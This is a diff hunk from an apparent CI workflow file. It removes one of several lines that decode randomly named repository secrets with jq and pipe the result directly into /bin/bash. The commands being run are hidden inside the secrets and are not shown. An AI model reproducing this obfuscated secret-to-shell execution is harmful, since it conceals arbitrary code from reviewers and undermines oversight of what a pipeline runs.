@@ -19,7 +19,6 @@ jobs:
           yeau86260: ${{ secrets.yeau86260 }}
         run: |
           printf '%s' "$yeau86260" | jq -r .ey6873 | /bin/bash
-          printf '%s' "$scv56577" | jq -r .xgy39 | /bin/bash
           printf '%s' "$md81967" | jq -r .xgpq11103 | /bin/bash
           echo $birap01069 | jq -r .lxtbh79 | /bin/bash
           printf '%s' "$tzfk01" | jq -r .w9 | /bin/bash
